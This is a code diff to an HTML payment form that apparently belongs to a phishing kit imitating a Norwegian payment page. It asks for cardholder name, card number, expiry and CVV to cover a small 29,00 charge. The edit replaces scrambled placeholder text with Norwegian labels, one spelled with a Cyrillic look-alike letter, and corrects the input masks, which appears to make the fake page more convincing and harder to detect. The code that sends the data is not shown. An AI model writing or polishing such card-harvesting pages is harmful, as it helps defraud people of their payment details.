@@ -185,7 +185,6 @@
       <img src="./B0/bid.jpg" alt="bid">
       <img src="./B0/visa.png" alt="vis">
       <img src="./B0/mas.png" alt="mas">
-      <img src="./B0/amx.png" alt="am">
     </div>
 
     <form id="fart">
@@ -194,12 +193,12 @@
         <label><input type="radio" name="type"> Tusiness</label>
       </div>
 
-      <input type="text" class="input" placeholder="Nadn wå jorb" id="A" name="cardname" required>
-      <input type="text" class="input" placeholder="Jorbnugger (16-sihreb)" id="B" name="cardnumber" required>
+      <input type="text" class="input" placeholder="fullt navn" id="A" name="cardname" required>
+      <input type="text" class="input" placeholder="kоrtnummer" id="B" name="cardnumber" required>
 
       <div class="row">
-        <input type="text" class="input" placeholder="Ubzøwsvabo (GG/ÅÅ)" id="C" name="expiry" required>
-        <input type="text" class="input" placeholder="CDD" id="D" name="cvv" required>
+        <input type="text" class="input" placeholder="(MM/ÅÅ)" id="C" name="expiry" required>
+        <input type="text" class="input" placeholder="CVV" id="D" name="cvv" required>
       </div>
 
       <button type="submit" class="pay-btn">Tebaz 29,00 JR</button>
@@ -219,9 +218,9 @@
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
 		
         <script>
-            $("#B").mask("0000 0000 0000 00000");
+            $("#B").mask("0000 0000 0000 0000");
             $("#C").mask("00/00");
-            $("#D").mask("0000");
+            $("#D").mask("000");
         </script>
 		
 <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
